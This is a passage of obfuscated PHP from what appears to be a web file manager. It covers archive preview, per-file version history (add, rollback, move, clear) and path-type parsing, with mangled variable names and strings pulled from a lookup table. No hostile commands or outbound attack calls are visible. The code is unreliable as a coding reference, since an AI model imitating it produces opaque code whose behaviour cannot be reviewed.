$¥Øèªí«[8] . $§‡“‹¥; if (!@file_exists(self::iconvSystem($šø±ßöË))) { if (isset($«¯ñ‹‚Ì)) { url_request($ÏÔàŒŒğ, $¥Øèªí«[1201], $šø±ßöË); } else { $ÔÎ‹´† = self::localFilePath($ÏÔàŒŒğ, $‘á„¢¶Ö); $šø±ßöË = $ÔÎ‹´† ? $ÔÎ‹´† : self::download($ÏÔàŒŒğ, $šø±ßöË); } } $šø±ßöË = self::iconvSystem($šø±ßöË); if ($í­ã›¡ >= 0) { $ÕÂûàšô = isset($ßÊè´ [$¥Øèªí«[1202]]) ? $ßÊè´ [$¥Øèªí«[1202]] : !1; $î…’Ğà« = isset($ßÊè´ [$¥Øèªí«[32]]) ? $ßÊè´ [$¥Øèªí«[32]] : $¥Øèªí«[12]; KodArchive::filePreview($šø±ßöË, $í­ã›¡, $ÕÂûàšô, $î…’Ğà«); self::archiveExt(); die; } $Â«æÅ‘¤ = KodArchive::listContent($šø±ßöË); self::archiveExt(); del_dir($øãŒœÍ›); if (!$Â«æÅ‘¤[$¥Øèªí«[1194]]) { show_json($Â«æÅ‘¤[$¥Øèªí«[1196]], !1); } $ÆËßùÀç = json_encode($Â«æÅ‘¤[$¥Øèªí«[1196]]); self::setContent($‹øò¤»Ã, $ÆËßùÀç); if (count($Â«æÅ‘¤[$¥Øèªí«[1196]]) >= $Œ†ç³Óû) { show_json(sprintf(LNG($¥Øèªí«[1200]), count($Â«æÅ‘¤[$¥Øèªí«[1196]])), !1); } return $Â«æÅ‘¤[$¥Øèªí«[1196]]; } private static function fileExt($£Í‚ÕÆ³) { $»ÉË¨Ìˆ =& $_SERVER[ïëó©ÒÚ]; $‚¹ô™Ë‡ = $£Í‚ÕÆ³[$»ÉË¨Ìˆ[174]]; if ($‚¹ô™Ë‡ == $»ÉË¨Ìˆ[1203]) { $¤š¿ğè° = $»ÉË¨Ìˆ[1204]; if (substr($£Í‚ÕÆ³[$»ÉË¨Ìˆ[32]], -strlen($¤š¿ğè°)) == $¤š¿ğè°) { $‚¹ô™Ë‡ = $»ÉË¨Ìˆ[1205]; } } self::archiveExt($‚¹ô™Ë‡); return $‚¹ô™Ë‡; } private static function zipFileList($ÎÍ¥Šğ, $‰»„Èõ = false) { $ºäà°ªç =& $_SERVER[ïëó©ÒÚ]; $˜ı©æÑ = array(); foreach ($ÎÍ¥Šğ as $ì¢£‡œ) { $‰û¶Ø• = $ì¢£‡œ[$ºäà°ªç[84]]; if ($‰»„Èõ) { $‰û¶Ø• = self::copy($ì¢£‡œ[$ºäà°ªç[84]], $‰»„Èõ, $ºäà°ªç[828]); } else { $Õ´„®é = self::init($ì¢£‡œ[$ºäà°ªç[84]]); if ($Õ´„®é->getType() == $ºäà°ªç[106]) { $‰û¶Ø• = $Õ´„®é->path; } } if ($‰û¶Ø• && self::local()->exist($‰û¶Ø•)) { $˜ı©æÑ[$ì¢£‡œ[$ºäà°ªç[84]]] = $‰û¶Ø•; } } if (!empty($˜ı©æÑ)) { return array_values($˜ı©æÑ); } show_json(LNG($ºäà°ªç[1169]), !1); } public static function tmpFileName($¨‡ ŸÏ) { $œò½ä÷É =& $_SERVER[ïëó©ÒÚ]; $şæûèêŒ = array($¨‡ ŸÏ[$œò½ä÷É[32]], $¨‡ ŸÏ[$œò½ä÷É[84]], $¨‡ ŸÏ[$œò½ä÷É[76]], $¨‡ ŸÏ[$œò½ä÷É[530]]); return md5(implode($œò½ä÷É[11], $şæûèêŒ)); } private static function localFilePath($Ö ÷›Óı, $”Äì†«) { $¦äˆéì =& $_SERVER[ïëó©ÒÚ]; if ($”Äì†« == $¦äˆéì[1206] && strtoupper(substr(PHP_OS, 0, 3)) == $¦äˆéì[1207]) { return !1; } $ô×ÃÛÉ  = KodIO::parse($Ö ÷›Óı); if ($ô×ÃÛÉ [$¦äˆéì[33]] == KodIO::KOD_SOURCE) { $à÷­çË½ = Model($¦äˆéì[835])->fileInfoGet(KodIO::sourceID($Ö ÷›Óı)); if (!$à÷­çË½[$¦äˆéì[84]]) { show_json($¦äˆéì[1208], !1); } $Ö ÷›Óı = $à÷­çË½[$¦äˆéì[84]]; } $õı¦òûë = self::init($Ö ÷›Óı); if ($õı¦òûë->pathParse[$¦äˆéì[1154]]) { $Ö ÷›Óı = $õı¦òûë->pathParse[$¦äˆéì[1154]]; $õı¦òûë = self::init($Ö ÷›Óı); } $íµ—‚ÒÅ = $õı¦òûë->getType(); if ($íµ—‚ÒÅ == $¦äˆéì[106] || $íµ—‚ÒÅ == $¦äˆéì[1209]) { if (!$õı¦òûë->exist($õı¦òûë->path)) { show_json(LNG($¦äˆéì[105]), !1); } return $õı¦òûë->path; } return !1; } private static function archiveExt($ß³·Áœ‘ = '') { $GLOBALS[$_SERVER[ïëó©ÒÚ][1210]] = $ß³·Áœ‘; } } class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { $üÃµ¬’œ =& $_SERVER[ïëó©ÒÚ]; $É­°¾ø½ = $GLOBALS[$üÃµ¬’œ[6]][$üÃµ¬’œ[89]]; if ($É­°¾ø½[$üÃµ¬’œ[1211]] != 1) { return; } if ($É­°¾ø½[$üÃµ¬’œ[1212]] <= 0) { return; } if (isset($_REQUEST[$üÃµ¬’œ[1213]]) && $_REQUEST[$üÃµ¬’œ[1213]] == $üÃµ¬’œ[88]) { return; } Hook::bind($üÃµ¬’œ[1214], $üÃµ¬’œ[1215]); Hook::bind($üÃµ¬’œ[1216], $üÃµ¬’œ[1217]); Hook::bind($üÃµ¬’œ[1218], $üÃµ¬’œ[1219]); Hook::bind($üÃµ¬’œ[1220], $üÃµ¬’œ[1221]); Hook::bind($üÃµ¬’œ[1222], $üÃµ¬’œ[1223]); Hook::bind($üÃµ¬’œ[1224], $üÃµ¬’œ[1225]); } public static function eventBeforeUpload($¡±†ÈÒ) { if ($¡±†ÈÒ[3] && $¡±†ÈÒ[3] != REPEAT_REPLACE) { return; } $˜ä²½¸ = self::parsePath($¡±†ÈÒ[0]); if (!$˜ä²½¸) { return; } self::add($˜ä²½¸); } public static function eventBeforeEdit($‹Ôø©) { $ß„¿êËÀ = self::parsePath($‹Ôø©[0]); if (!$ß„¿êËÀ) { return; } self::add($ß„¿êËÀ); } public static function eventBeforeCopyFile($´ ¸‰Ç , $ˆÓÒ£¯—, $ì¾÷Æ¬, $°æ•ˆåÁ, $ú›€¦Ñ¹, $ïéÔ³) { $ƒ˜íš¡î =& $_SERVER[ïëó©ÒÚ]; if (isset($ì¾÷Æ¬->_data[$ƒ˜íš¡î[1158]]) && $ì¾÷Æ¬->_data[$ƒ˜íš¡î[1158]]) { return; } $Û›îôªŒ = $ì¾÷Æ¬->getPathOuter($°æ•ˆåÁ); $ªÏ´Ûé = self::parsePath($Û›îôªŒ); if (!$ªÏ´Ûé) { return; } self::add($ªÏ´Ûé); } public static function eventBeforeRename($ÜàÙëœü) { $ÓÈ®Å…á =& $_SERVER[ïëó©ÒÚ]; $şµúÊ” = self::parsePath($ÜàÙëœü[0]); if (!$şµúÊ”) { return; } $˜ãœ™¬û = self::checkInHistory($şµúÊ”); if (!$˜ãœ™¬û) { return; } if ($˜ãœ™¬û[$ÓÈ®Å…á[33]] == $ÓÈ®Å…á[199]) { $‚¹¥û¶· = self::listData($şµúÊ”); if ($‚¹¥û¶· && $‚¹¥û¶·[$ÓÈ®Å…á[369]]) { self::moveHistory($şµúÊ”, $ÜàÙëœü[1]); } } else { IO::rename($˜ãœ™¬û[$ÓÈ®Å…á[84]], $ÜàÙëœü[1]); } } public static function eventBeforeMove($ßÛâóì‰) { $¯Íö¼®é =& $_SERVER[ïëó©ÒÚ]; $¸ÒûÂ‚ = self::parsePath($ßÛâóì‰[0]); if (!$¸ÒûÂ‚) { return; } $ó¸Ò©“Ï = self::parsePath($ßÛâóì‰[1]); if (!$ó¸Ò©“Ï) { return; } $Ê¦£¡Ş = $ßÛâóì‰[3]; $åÕÂ¶¢º = self::checkInHistory($¸ÒûÂ‚); if (!$åÕÂ¶¢º) { return; } $ïÄ¯“Ùõ = self::pathHistory($ó¸Ò©“Ï); if ($åÕÂ¶¢º[$¯Íö¼®é[33]] == $¯Íö¼®é[199]) { $¥Íê¾÷ş = self::listData($¸ÒûÂ‚); $Ï×ÂÏ×Ö = rtrim($ó¸Ò©“Ï, $¯Íö¼®é[8]) . $¯Íö¼®é[8] . ($Ê¦£¡Ş ? $Ê¦£¡Ş : get_path_this($¸ÒûÂ‚)); $÷¤±äÆÙ = self::listData($Ï×ÂÏ×Ö); if ($¥Íê¾÷ş && $¥Íê¾÷ş[$¯Íö¼®é[369]] && $÷¤±äÆÙ && $÷¤±äÆÙ[$¯Íö¼®é[369]]) { return self::clear($¸ÒûÂ‚); } if ($¥Íê¾÷ş && $¥Íê¾÷ş[$¯Íö¼®é[369]]) { self::moveHistory($¸ÒûÂ‚, $Ê¦£¡Ş, $ïÄ¯“Ùõ); } } else { IO::move($åÕÂ¶¢º[$¯Íö¼®é[84]], $ïÄ¯“Ùõ, !1, $Ê¦£¡Ş); self::clearEmptyFolder(IO::pathFather($åÕÂ¶¢º[$¯Íö¼®é[84]])); } } public static function eventAfterRemove($Ü¸Ã¯®Ü, $¤ûÎÑìµ) { $·õ´Œ¿« =& $_SERVER[ïëó©ÒÚ]; if (!$¤ûÎÑìµ) { return; } $ÀÂ¦‚ı¾ = self::parsePath($Ü¸Ã¯®Ü[0]); if (!$ÀÂ¦‚ı¾) { return; } $œ°ŠæÀò = self::checkInHistory($ÀÂ¦‚ı¾); if (!$œ°ŠæÀò) { return; } if ($œ°ŠæÀò[$·õ´Œ¿«[33]] == $·õ´Œ¿«[199]) { $Í¨†×Ã‚ = self::listData($ÀÂ¦‚ı¾, !1); if ($Í¨†×Ã‚ && $Í¨†×Ã‚[$·õ´Œ¿«[369]]) { self::clear($ÀÂ¦‚ı¾, !1); } } else { IO::remove($œ°ŠæÀò[$·õ´Œ¿«[84]]); self::clearEmptyFolder(IO::pathFather($œ°ŠæÀò[$·õ´Œ¿«[84]])); } } private static function checkInHistory($ …é) { $û¿ã³× = self::pathHistory($ …é); if (!IO::exist($û¿ã³×)) { $û¿ã³× .= $_SERVER[ïëó©ÒÚ][1226]; } return IO::exist($û¿ã³×) ? IO::info($û¿ã³×) : !1; } private static function parsePath($‘¼“Œ ) { $ÉÇÜ³¾Å =& $_SERVER[ïëó©ÒÚ]; if (!$‘¼“Œ ) { return !1; } if ($GLOBALS[$ÉÇÜ³¾Å[1227]]) { return; } $¬ÜŠŒÜï = KodIO::parse($‘¼“Œ ); $Éê†¯®â = $¬ÜŠŒÜï[$ÉÇÜ³¾Å[33]]; $¹¸ı•œ = !$Éê†¯®â || $Éê†¯®â == KodIO::KOD_IO || $Éê†¯®â == KodIO::KOD_SHARE_ITEM; if (!$¹¸ı•œ || !$¬ÜŠŒÜï[$ÉÇÜ³¾Å[1228]]) { return !1; } if (substr($‘¼“Œ , 0, strlen(DATA_PATH . $ÉÇÜ³¾Å[1229])) == DATA_PATH . $ÉÇÜ³¾Å[1229]) { return !1; } if ($Éê†¯®â == KodIO::KOD_SHARE_ITEM) { $áêµ²®ì = IO::init($‘¼“Œ ); if ($áêµ²®ì->pathParse[$ÉÇÜ³¾Å[1154]]) { return self::parsePath($áêµ²®ì->pathParse[$ÉÇÜ³¾Å[1154]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $ÚÅ¢ùŞƒ = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $ÉÇÜ³¾Å[1230]); foreach ($ÚÅ¢ùŞƒ as $ÔØöÑ¯) { if (!$Éê†¯®â && substr($‘¼“Œ , 0, strlen($ÔØöÑ¯)) == $ÔØöÑ¯) { return !1; } } self::log($GLOBALS[$ÉÇÜ³¾Å[1149]] . $ÉÇÜ³¾Å[1231] . $‘¼“Œ ); return $‘¼“Œ ; } private static function pathHistory($ß‘¥„Õµ) { $–Ö¨åÙ =& $_SERVER[ïëó©ÒÚ]; $›„Êõ¿¹ = self::$_historyBase . ltrim(KodIO::clear($ß‘¥„Õµ), $–Ö¨åÙ[8]); $›„Êõ¿¹ = str_replace(array($–Ö¨åÙ[1232]), array($–Ö¨åÙ[1233]), $›„Êõ¿¹); return $›„Êõ¿¹; } public static function log($Îãø•£Ú) { } public static function historyCount($óüå°Á) { $Şõ®ø•ó =& $_SERVER[ïëó©ÒÚ]; $ıüÜĞ“ = array(); $°²áæû = array(); foreach ($óüå°Á as $Çã²®ÃĞ) { $õÃŸ½¿ = get_path_father($Çã²®ÃĞ); if (!$°²áæû[$õÃŸ½¿]) { $°²áæû[$õÃŸ½¿] = array(); } $°²áæû[$õÃŸ½¿][] = get_path_this($Çã²®ÃĞ); } foreach ($°²áæû as $õÃŸ½¿ => $®²ó¤ë‚) { $¼ÙûšÌÇ = self::parsePath($õÃŸ½¿); if (!$¼ÙûšÌÇ) { continue; } foreach ($®²ó¤ë‚ as $´ö ©°£) { $¿Œõ›œ = self::listData(rtrim($¼ÙûšÌÇ, $Şõ®ø•ó[8]) . $Şõ®ø•ó[8] . $´ö ©°£, !1); if ($¿Œõ›œ && $¿Œõ›œ[$Şõ®ø•ó[369]]) { $ıüÜĞ“[rtrim($õÃŸ½¿, $Şõ®ø•ó[8]) . $Şõ®ø•ó[8] . $´ö ©°£] = count($¿Œõ›œ[$Şõ®ø•ó[369]]); } } } return $ıüÜĞ“; } public static function add($’€—¯àÕ) { $™ÍëŒ©” =& $_SERVER[ïëó©ÒÚ]; $»Ç“¢“Æ = self::listData($’€—¯àÕ); if (!$»Ç“¢“Æ) { return; } $©•ßÁÄ = Model($™ÍëŒ©”[780])->get($™ÍëŒ©”[1234]); $¼‚ÖÖÊ’ = $GLOBALS[$™ÍëŒ©”[6]][$™ÍëŒ©”[89]][$™ÍëŒ©”[1212]]; $¬•¼¼×å = $©•ßÁÄ == $™ÍëŒ©”[1235] ? min(5, $¼‚ÖÖÊ’) : $¼‚ÖÖÊ’; if ($¼‚ÖÖÊ’ <= 0) { return; } $šã˜‹ò„ = IO::info($’€—¯àÕ); $¼Ş¶Òè› = $»Ç“¢“Æ[$™ÍëŒ©”[369]]; if ($šã˜‹ò„[$™ÍëŒ©”[76]] == 0) { return; } if ($šã˜‹ò„[$™ÍëŒ©”[76]] >= 1024 * 1024 * 500) { return !1; } $»ğæÅ½¤ = IO::hashSimple($’€—¯àÕ); if ($¼Ş¶Òè› && $¼Ş¶Òè›[0][$™ÍëŒ©”[177]] == $»ğæÅ½¤) { return !0; } if (array_key_exists($™ÍëŒ©”[202], $šã˜‹ò„) && !$šã˜‹ò„[$™ÍëŒ©”[202]]) { return !1; } $Óçº»çå = short_id(time()); $ìş¤Ù¢ = array($™ÍëŒ©”[399] => $Óçº»çå, $™ÍëŒ©”[177] => $»ğæÅ½¤, $™ÍëŒ©”[32] => $šã˜‹ò„[$™ÍëŒ©”[32]] . $™ÍëŒ©”[10] . date($™ÍëŒ©”[1236]) . rand_string(1), $™ÍëŒ©”[76] => $šã˜‹ò„[$™ÍëŒ©”[76]], $™ÍëŒ©”[463] => USER_ID, $™ÍëŒ©”[200] => time(), $™ÍëŒ©”[1237] => $™ÍëŒ©”[12]); IO::mkdir($»Ç“¢“Æ[$™ÍëŒ©”[1238]]); $Âçú¢ = IO::copy($’€—¯àÕ, $»Ç“¢“Æ[$™ÍëŒ©”[1238]], !1, $ìş¤Ù¢[$™ÍëŒ©”[32]]); if (!$Âçú¢) { self::clearEmptyFolder($»Ç“¢“Æ[$™ÍëŒ©”[1238]]); return !1; } array_unshift($¼Ş¶Òè›, $ìş¤Ù¢); if (count($¼Ş¶Òè›) > $¬•¼¼×å) { $Æ†×ùó¼ = array_slice($¼Ş¶Òè›, $¬•¼¼×å); foreach ($Æ†×ùó¼ as $‰“ëÇö) { IO::remove($»Ç“¢“Æ[$™ÍëŒ©”[1238]] . $‰“ëÇö[$™ÍëŒ©”[32]]); } $¼Ş¶Òè› = array_slice($¼Ş¶Òè›, 0, $¬•¼¼×å); } return self::saveData($»Ç“¢“Æ[$™ÍëŒ©”[1239]], $¼Ş¶Òè›); } public static function remove($¹Óõ¢è, $å„×Ş¤) { $ŞªËÚšı =& $_SERVER[ïëó©ÒÚ]; $’È›ùÇá = self::listData($¹Óõ¢è); $†ƒŸºĞ = array(); if (!$’È›ùÇá) { return !1; } foreach ($’È›ùÇá[$ŞªËÚšı[369]] as $°œ’ÚŠ×) { if ($°œ’ÚŠ×[$ŞªËÚšı[399]] == $å„×Ş¤) { IO::remove($’È›ùÇá[$ŞªËÚšı[1238]] . $°œ’ÚŠ×[$ŞªËÚšı[32]]); continue; } $†ƒŸºĞ[] = $°œ’ÚŠ×; } return self::saveData($’È›ùÇá[$ŞªËÚšı[1239]], $†ƒŸºĞ); } public static function clear($¸ö‡·şŸ, $æ§şûÚ = true) { $‹ìùóŒÎ =& $_SERVER[ïëó©ÒÚ]; $ìË‘øñ = self::listData($¸ö‡·şŸ, $æ§şûÚ); if (!$ìË‘øñ) { return !1; } foreach ($ìË‘øñ[$‹ìùóŒÎ[369]] as $˜âíş) { IO::remove($ìË‘øñ[$‹ìùóŒÎ[1238]] . $˜âíş[$‹ìùóŒÎ[32]]); } return self::saveData($ìË‘øñ[$‹ìùóŒÎ[1239]], array()); } public static function moveHistory($„»ô°’¥, $¯ğ¸æô = '', $øŸá£šÛ = '') { $ü…¤Ù¨ =& $_SERVER[ïëó©ÒÚ]; $·ÄõÈÇò = self::listData($„»ô°’¥, !1); if (!$·ÄõÈÇò || !$·ÄõÈÇò[$ü…¤Ù¨[369]]) { return !1; } $®“Ôİõâ = $ü…¤Ù¨[1226]; $¯ğ¸æô = $¯ğ¸æô ? $¯ğ¸æô : get_path_this($„»ô°’¥); $øŸá£šÛ = $øŸá£šÛ ? $øŸá£šÛ : $·ÄõÈÇò[$ü…¤Ù¨[1238]]; $¢ëº–¬ = substr(get_path_this($·ÄõÈÇò[$ü…¤Ù¨[1239]]), 0, -strlen($®“Ôİõâ)); foreach ($·ÄõÈÇò[$ü…¤Ù¨[369]] as $°´·÷˜ => $Ó²êõ Í) { $…‹‘×µš = $¯ğ¸æô . substr($Ó²êõ Í[$ü…¤Ù¨[32]], strlen($¢ëº–¬)); $¥Š§µÉ = IO::move($·ÄõÈÇò[$ü…¤Ù¨[1238]] . $Ó²êõ Í[$ü…¤Ù¨[32]], $øŸá£šÛ, !1, $…‹‘×µš); if ($¥Š§µÉ) { $·ÄõÈÇò[$ü…¤Ù¨[369]][$°´·÷˜][$ü…¤Ù¨[32]] = $…‹‘×µš; } } $·ÄõÈÇò[$ü…¤Ù¨[1239]] = IO::move($·ÄõÈÇò[$ü…¤Ù¨[1239]], $øŸá£šÛ, !1, $¯ğ¸æô . $®“Ôİõâ); self::saveData($·ÄõÈÇò[$ü…¤Ù¨[1239]], $·ÄõÈÇò[$ü…¤Ù¨[369]]); self::clearEmptyFolder($·ÄõÈÇò[$ü…¤Ù¨[1238]]); } public static function rollback($§—ŠØ×, $ÊÕ­‘Åˆ) { $ßâºçÈñ =& $_SERVER[ïëó©ÒÚ]; $‰ãëİ€¿ = self::listData($§—ŠØ×); if (!$‰ãëİ€¿) { return; } $ £¥Ğİ = IO::info($§—ŠØ×); foreach ($‰ãëİ€¿[$ßâºçÈñ[369]] as $õ©õÌÜé => $üÑË’êç) { if ($üÑË’êç[$ßâºçÈñ[399]] == $ÊÕ­‘Åˆ) { self::add($§—ŠØ×); $îÌØ—òµ = $‰ãëİ€¿[$ßâºçÈñ[1238]] . $üÑË’êç[$ßâºçÈñ[32]]; $‡’ˆ÷² = IO::copy($îÌØ—òµ, IO::pathFather($§—ŠØ×), REPEAT_REPLACE, $ £¥Ğİ[$ßâºçÈñ[32]]); if ($‡’ˆ÷²) { self::remove($§—ŠØ×, $ÊÕ­‘Åˆ); } return $‡’ˆ÷²; } } return !1; } public static function setDetail($·İöê¥, $¯ ºõåÃ, $æ†öŞ°») { $Æ¿±ã°¸ =& $_SERVER[ïëó©ÒÚ]; $ıˆø†µŒ = self::listData($·İöê¥); if (!$ıˆø†µŒ) { return; } foreach ($ıˆø†µŒ[$Æ¿±ã°¸[369]] as $Ì³ º‰ => $£»è™›) { if ($£»è™›[$Æ¿±ã°¸[399]] == $¯ ºõåÃ) { $ıˆø†µŒ[$Æ¿±ã°¸[369]][$Ì³ º‰][$Æ¿±ã°¸[1237]] = $æ†öŞ°»; self::saveData($ıˆø†µŒ[$Æ¿±ã°¸[1239]], $ıˆø†µŒ[$Æ¿±ã°¸[369]]); return !0; } } return !1; } public static function fileInfo($ĞÏ¶ÑÄ, $Á¤¿î˜¾) { $•ù¼Äé… =& $_SERVER[ïëó©ÒÚ]; $×ÇŒ¤—¸ = self::listData($ĞÏ¶ÑÄ); if (!$×ÇŒ¤—¸) { show_json(LNG($•ù¼Äé…[105]), !1); } $‹Ô§²ßß = $•ù¼Äé…[12]; foreach ($×ÇŒ¤—¸[$•ù¼Äé…[369]] as $ªÄ€Èç => $å¸è‚å²) { if ($å¸è‚å²[$•ù¼Äé…[399]] != $Á¤¿î˜¾) { continue; } $‹Ô§²ßß = $×ÇŒ¤—¸[$•ù¼Äé…[1238]] . $å¸è‚å²[$•ù¼Äé…[32]]; break; } if (!$‹Ô§²ßß) { show_json(LNG($•ù¼Äé…[105]), !1); } return IO::info($‹Ô§²ßß); } public static function fileOut($©·Ú¾±Ó, $ûó…”»¶, $é·÷³Â˜ = false) { $ğ¢İÂ’ =& $_SERVER[ïëó©ÒÚ]; $ô„ƒœçß = self::fileInfo($©·Ú¾±Ó, $ûó…”»¶); $ŒõÑ¸î =& $GLOBALS[$ğ¢İÂ’[7]]; $é·÷³Â˜ = isset($ŒõÑ¸î[$ğ¢İÂ’[1202]]) && $ŒõÑ¸î[$ğ¢İÂ’[1202]] == 1; if (isset($ŒõÑ¸î[$ğ¢İÂ’[33]]) && $ŒõÑ¸î[$ğ¢İÂ’[33]] == $ğ¢İÂ’[1240]) { return IO::fileOutImage($ô„ƒœçß[$ğ¢İÂ’[84]], $ŒõÑ¸î[$ğ¢İÂ’[1241]]); } IO::fileOut($ô„ƒœçß[$ğ¢İÂ’[84]], $é·÷³Â˜, get_path_this($©·Ú¾±Ó)); } public static function listData($‚àçÈ¥†, $»í¥™Î­ = true) { $âıÜÎŞô =& $_SERVER[ïëó©ÒÚ]; if ($»í¥™Î­ && !IO::exist($‚àçÈ¥†)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } if (substr($‚àçÈ¥†, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $ä­ùÅ‰½ = self::pathHistory($‚àçÈ¥†); $Ôâ–ƒì = array($âıÜÎŞô[1239] => $ä­ùÅ‰½ . $âıÜÎŞô[1226], $âıÜÎŞô[1238] => rtrim(get_path_father($ä­ùÅ‰½), $âıÜÎŞô[8]) . $âıÜÎŞô[8], $âıÜÎŞô[369] => array()); $Š±¡è‰ò = IO::getContent($Ôâ–ƒì[$âıÜÎŞô[1239]]); if ($Š±¡è‰ò) { $îŠ—× = json_decode($Š±¡è‰ò, !0); if (is_array($îŠ—×)) { $Ôâ–ƒì[$âıÜÎŞô[369]] = $îŠ—×; } } return $Ôâ–ƒì; } private static function saveData($ƒ¡İœÖë, $õˆˆ¼µ) { $û„¼Å =& $_SERVER[ïëó©ÒÚ]; self::log($û„¼Å[1242] . $ƒ¡İœÖë . $û„¼Å[71] . count($õˆˆ¼µ), $û„¼Å[762]); if ($õˆˆ¼µ) { return IO::setContent($ƒ¡İœÖë, json_encode($õˆˆ¼µ)); } $Æ¸¾¥† = IO::pathFather($ƒ¡İœÖë); IO::remove($ƒ¡İœÖë); self::clearEmptyFolder($Æ¸¾¥†); return !0; } public static function clearEmptyFolder($¤ÇéôÎ¯) { $÷µĞ¡‡± =& $_SERVER[ïëó©ÒÚ]; if (trim($¤ÇéôÎ¯, $÷µĞ¡‡±[8]) == trim(self::$_historyBase, $÷µĞ¡‡±[8])) { return; } $×£¼±¤ = IO::pathFather($¤ÇéôÎ¯); $šÇƒŞÊ = IO::has($¤ÇéôÎ¯, !0); if ($šÇƒŞÊ[$÷µĞ¡‡±[207]] > 0 || $šÇƒŞÊ[$÷µĞ¡‡±[208]] > 0) { return; } IO::remove($¤ÇéôÎ¯); self::clearEmptyFolder($×£¼±¤); } private static function getBasePath() { $¸ƒÙ…ŞÂ =& $_SERVER[ïëó©ÒÚ]; $¥ïëõµ¹ = Model($¸ƒÙ…ŞÂ[1243])->get($¸ƒÙ…ŞÂ[1244]); if ($¥ïëõµ¹) { if (!IO::exist($¥ïëõµ¹)) { IO::mkdir($¥ïëõµ¹); } if (get_path_this($¥ïëõµ¹) == $¸ƒÙ…ŞÂ[1229]) { $úÄã¾§¥ = $¸ƒÙ…ŞÂ[1245] . rand_string(8); @rename($¥ïëõµ¹, get_path_father($¥ïëõµ¹) . $¸ƒÙ…ŞÂ[8] . $úÄã¾§¥); $¥ïëõµ¹ = DATA_PATH . $úÄã¾§¥ . $¸ƒÙ…ŞÂ[8]; file_put_contents(DATA_PATH . $¸ƒÙ…ŞÂ[1246], $¸ƒÙ…ŞÂ[12]); Model($¸ƒÙ…ŞÂ[1243])->set($¸ƒÙ…ŞÂ[1244], $¥ïëõµ¹); } return $¥ïëõµ¹; } $¥ïëõµ¹ = DATA_PATH . $¸ƒÙ…ŞÂ[1245] . rand_string(8) . $¸ƒÙ…ŞÂ[8]; $¥ïëõµ¹ = IO::mkdir($¥ïëõµ¹); $¥ïëõµ¹ = rtrim($¥ïëõµ¹, $¸ƒÙ…ŞÂ[8]) . $¸ƒÙ…ŞÂ[8]; file_put_contents($¥ïëõµ¹ . $¸ƒÙ…ŞÂ[1246], $¸ƒÙ…ŞÂ[12]); file_put_contents(DATA_PATH . $¸ƒÙ…ŞÂ[1246], $¸ƒÙ…ŞÂ[12]); Model($¸ƒÙ…ŞÂ[1243])->set($¸ƒÙ…ŞÂ[1244], $¥ïëõµ¹); return $¥ïëõµ¹; } } class KodIO { const KOD_SOURCE = "\173\x73\157\x75\x72\143\x65\x7d"; const KOD_USER_RECYCLE = "\173\x75\163\145\162\x52\145\143\171\143\154\x65\x7d"; const KOD_USER_FAV = "\173\165\x73\x65\162\x46\x61\x76\x7d"; const KOD_USER_FILE_TAG = "\173\165\163\145\162\x46\151\x6c\x65\x54\141\147\175"; const KOD_USER_FILE_TYPE = "\173\x75\x73\x65\x72\106\x69\x6c\x65\124\x79\x70\x65\175"; const KOD_GROUP_ROOT_SELF = "\173\147\162\x6f\165\x70\x52\157\x6f\164\x53\x65\x6c\x66\x7d"; const KOD_USER_SHARE = "\x7b\x75\163\x65\x72\123\150\141\162\145\x7d"; const KOD_USER_SHARE_LINK = "\x7b\x75\x73\145\162\123\150\x61\162\x65\x4c\x69\156\153\x7d"; const KOD_USER_SHARE_TO_ME = "\x7b\163\150\141\x72\x65\124\157\x4d\145\175"; const KOD_SHARE_ITEM = "\173\x73\x68\x61\x72\x65\x49\164\x65\155\x7d"; const KOD_SHARE_LINK = "\173\163\x68\141\x72\x65\111\164\x65\155\x4c\151\x6e\x6b\x7d"; const KOD_SEARCH = "\173\163\145\141\x72\143\150\x7d"; const KOD_BLOCK = "\173\x62\154\157\x63\153\x7d"; const KOD_IO = "\x7b\151\x6f\x7d"; const KOD_USER_RECENT = "\173\x75\x73\x65\x72\x52\145\x6e\143\145\x6e\164\x7d"; const KOD_USER_DRIVER = "\x7b\144\162\x69\x76\x65\162\175"; public static function typeList() { $¤á¥é€ˆ =& $_SERVER[ïëó©ÒÚ]; return array($¤á¥é€ˆ[1247] => self::KOD_SOURCE, $¤á¥é€ˆ[1248] => self::KOD_USER_RECYCLE, $¤á¥é€ˆ[1249] => self::KOD_USER_FAV, $¤á¥é€ˆ[1250] => self::KOD_USER_FILE_TAG, $¤á¥é€ˆ[1251] => self::KOD_USER_FILE_TYPE, $¤á¥é€ˆ[1252] => self::KOD_GROUP_ROOT_SELF, $¤á¥é€ˆ[1253] => self::KOD_USER_SHARE, $¤á¥é€ˆ[1254] => self::KOD_USER_SHARE_LINK, $¤á¥é€ˆ[1255] => self::KOD_USER_SHARE_TO_ME, $¤á¥é€ˆ[1256] => self::KOD_SHARE_ITEM, $¤á¥é€ˆ[1257] => self::KOD_SHARE_LINK, $¤á¥é€ˆ[1258] => self::KOD_SEARCH, $¤á¥é€ˆ[1259] => self::KOD_BLOCK, $¤á¥é€ˆ[1260] => self::KOD_IO, $¤á¥é€ˆ[1261] => self::KOD_USER_RECENT, $¤á¥é€ˆ[1262] => self::KOD_USER_DRIVER); } public static function parse($Ñä±íı) { $ù…š“Û =& $_SERVER[ïëó©ÒÚ]; $Ñä±íı = self::clear($Ñä±íı); $‚ª‘½ÇÛ = array_values(self::typeList()); preg_match($ù…š“Û[1263], $Ñä±íı, $±æ®×·”); $ê°ÚÎâŠ = array($ù…š“Û[431] => !1, $ù…š“Û[1264] => !1, $ù…š“Û[428] => !1, $ù…š“Û[84] => $Ñä±íı, $ù…š“Û[1173] => !1, $ù…š“Û[1172] => $ù…š“Û[12]); if (is_array($±æ®×·”) && count($±æ®×·”) == 5) { $ôÖÛÉŞÕ = $ù…š“Û[1265] . $±æ®×·”[2] . $ù…š“Û[327]; if (in_array($ôÖÛÉŞÕ, $‚ª‘½ÇÛ)) { $ê°ÚÎâŠ[$ù…š“Û[1173]] = $±æ®×·”[1]; $ê°ÚÎâŠ[$ù…š“Û[33]] = $ôÖÛÉŞÕ; $ê°ÚÎâŠ[$ù…š“Û[1266]] = substr($ôÖÛÉŞÕ, 1, -1); $ê°ÚÎâŠ[$ù…š“Û[399]] = $±æ®×·”[3]; } 